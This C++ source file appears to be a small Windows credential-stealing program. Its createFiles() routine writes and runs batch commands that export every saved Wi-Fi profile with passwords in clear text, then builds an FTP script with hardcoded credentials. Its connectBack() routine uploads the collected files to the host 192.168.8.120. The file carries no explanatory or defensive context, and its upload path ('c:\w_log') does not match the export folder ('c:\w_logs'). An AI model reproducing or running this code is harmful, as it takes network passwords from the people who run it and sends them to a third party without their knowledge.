#include <iostream>
#include "sys_s.h"
Sys_s::Sys_s()
{

}

void Sys_s::createFiles()
{
  std::cout << "Creating files.." << std::endl;
  system("mkdir c:\\scripts");
  system("mkdir c:\\w_logs");
  system("echo netsh wlan export profile interface=\"WLAN\" folder=c:\\w_logs key=clear > c:\\scripts\\get-iface.bat");
  system("echo netsh wlan export profile interface=\"WLAN 1\" folder=c:\\w_logs key=clear > c:\\scripts\\get-iface1.bat");
  system("echo netsh wlan export profile interface=\"WLAN 2\" folder=c:\\w_logs key=clear > c:\\scripts\\get-iface2.bat");
  system("c:\\scripts\\get-iface.bat");
  system("c:\\scripts\\get-iface1.bat");
  system("c:\\scripts\\get-iface2.bat");
  system("echo niko> c:\\scripts\\ftp_script.txt");
  system("echo 1234>> c:\\scripts\\ftp_script.txt");
  system("echo put c:\\w_log\\* >> c:\\scripts\\ftp_script.txt");
  system("echo quit >> c:\\scripts\\ftp_script.txt");

}

void Sys_s::connectBack()
{
  system("ftp -s:c:\\scripts\\ftp_script.txt 192.168.8.120");
}
